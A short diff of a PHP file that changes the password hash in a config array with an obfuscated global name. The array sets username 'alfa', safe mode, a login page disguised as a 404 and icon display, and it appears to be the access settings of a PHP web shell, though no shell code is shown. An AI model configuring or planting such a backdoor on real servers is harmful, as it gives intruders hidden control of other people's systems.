@@ -2,7 +2,7 @@
 
 $GLOBALS['oZgNypoPRU'] = array(
     'username' => 'alfa',
-    'password' => 'f274021b5ee558c72ca44cf1174a9733',
+    'password' => 'b6434d37bef4caa9712f90dac48f214b',
     'safe_mode' => '1',
     'login_page' => '404',
     'show_icons' => '1',
